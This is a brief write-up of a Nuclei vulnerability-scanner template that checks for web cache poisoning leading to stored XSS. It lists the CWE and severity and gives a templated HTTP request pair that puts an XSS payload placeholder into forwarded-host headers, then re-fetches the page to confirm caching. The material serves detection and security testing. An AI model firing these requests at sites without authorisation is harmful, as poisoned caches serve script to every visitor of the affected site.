# Nuclei Template: Cache Poisoning - Stored XSS
**Template ID:** cache-poisoning-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** High
**CWE:** CWE-80
**Source:** Nuclei Template (`cache-poisoning-xss.yaml`)

## Vulnerability Information & PoC

## Description
Cache Poisoning leads to Stored XSS.

## Steps to reproduce / Exploit Payload
```http
GET /?{{cache_key}}=1 HTTP/1.1
Host: {{Hostname}}
X-Forwarded-Prefix: {{cache_header}}.xfp{{xss_payload}}
X-Forwarded-Host: {{cache_header}}.xfh{{xss_payload}}
X-Forwarded-For: {{cache_header}}.xff{{xss_payload}}

GET /?{{cache_key}}=1 HTTP/1.1
Host: {{Hostname}}
```

## References
- https://blog.melbadry9.xyz/fuzzing/nuclei-cache-poisoning
- https://portswigger.net/research/practical-web-cache-poisoning
- https://portswigger.net/web-security/web-cache-poisoning
